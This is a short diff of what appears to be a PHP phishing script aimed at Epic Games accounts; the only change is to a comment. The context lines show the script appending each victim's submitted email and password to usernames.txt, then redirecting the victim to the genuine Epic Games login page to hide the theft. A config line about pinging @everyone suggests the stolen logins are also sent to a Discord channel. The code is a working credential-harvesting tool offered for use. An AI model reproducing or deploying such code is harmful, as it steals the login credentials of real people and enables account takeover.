@@ -6,7 +6,7 @@ $ping = ""; // You can put @here or @everyone or <@userid> if you want to ping a
 
 
 
-// DONT TOUCH THE CODE UNDER OR YOUR SCRIPT WILL NOT WORK !!
+// DONT TOUCH THE CODE UNDER OR YOUR SCRIPT WILL NOT WORK !
 file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.epicgames.com/id/login/epic');
 $email = $_POST['email'];
